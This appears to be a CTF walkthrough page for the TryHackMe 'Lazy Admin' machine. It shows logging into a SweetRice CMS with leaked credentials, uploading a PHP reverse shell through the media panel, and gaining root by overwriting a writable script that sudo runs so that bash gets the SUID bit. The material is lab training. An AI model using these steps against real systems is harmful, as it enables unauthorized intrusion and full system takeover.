---
sidebar_position: 2
title: Lazy Admin 
sidebar_label: Exploitation
description: Easy Linux machine to practice your Skills.
keywords: [lazy admin, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, ffuf, sql backup, john, privilege escalation, sweetrice]
---

## SweetRice

- **SweetRice Login Portal:** <b style={{ color: 'SandyBrown' }}>[IP:80/content/as]</b> 
- We can use the previous found **Credentials** from **SQL BackUP** to Login: <b style={{ color: 'Chartreuse' }}>manager</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>Password123</b>


![LA](/img/vmlinux/l-loginsweet.png)


<br/>

We can Upload the **Reverse Shell** using the `ADS` or `MEDIA CENTER` Panel.


- <b style={{ color: 'Coral' }}>[1].</b> Uploading using <span style={{fontWeight: 'Bold'}}>ADS</span> our <span style={{fontWeight: 'Bold'}}>Reverse Shell</span> will be Located at: <b style={{ color: 'SandyBrown' }}>[IP:80/content/inc/ads]</b>
- <b style={{ color: 'Coral' }}>[1].</b> Uploading using <span style={{fontWeight: 'Bold'}}>MEDIA CENTER</span> our <span style={{fontWeight: 'Bold'}}>Reverse Shell</span> will be Located at: <b style={{ color: 'SandyBrown' }}>[IP:80/content/attachment]</b>


<br/>

- Uploading the **Reverse Shell** Using `MEDIA CENTER`

![LA](/img/vmlinux/l-mediacenter.png)


<br/>

- **The `Reverse Shell` got Successfully Uploaded to:** <b style={{ color: 'SandyBrown' }}>[IP:80/content/attachment]</b>

```log
   [ICO]             Name            Last modified   Size Description
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[PARENTDIR] Parent Directory                            -  
[ ]         php-reverse-shell.phtml 2022-10-07 10:03 5.4K  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```


<br/>

---
## Privilege Escalation

- **We can catch the Reverse Shell Using `netcat`** 

```bash
www-data@THM-Chal /$  id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<br/>

- **The User `www-data` can run:** <b style={{ color: 'Coral' }}>[/usr/bin/perl</b> <b style={{ color: 'Coral' }}>/home/itguy/backup.pl]</b> with <b style={{ color: 'Red' }}>ROOT</b> Privileges.
- The **`backup.pl`** executes a Script Located in: **`/etc/copy.sh`**. We have **WRITE Permissions** on the Script.

```bash
www-data@THM-Chal /$  sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

```bash
www-data@THM-Chal /$  ls -l /home/  
drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 itguy
www-data@THM-Chal /$  ls -l /home/itguy/
...
-rw-r--r-x 1 root  root    47 Nov 29  2019 backup.pl
...
www-data@THM-Chal /$  cat /home/itguy/backup.pl 
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

<br/>

- **We move into `/tmp` Directory and run the Following:**

```bash
www-data@THM-Chal tmp$  echo "chmod +s /bin/bash" > SUID.sh
www-data@THM-Chal tmp$  echo "sh /tmp/SUID.sh" > /etc/copy.sh
www-data@THM-Chal tmp$  sudo /usr/bin/perl /home/itguy/backup.pl
```

```bash
www-data@THM-Chal tmp$  /bin/bash -p
www-data@THM-Chal tmp$  id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
www-data@THM-Chal tmp$  whoami
root
```

---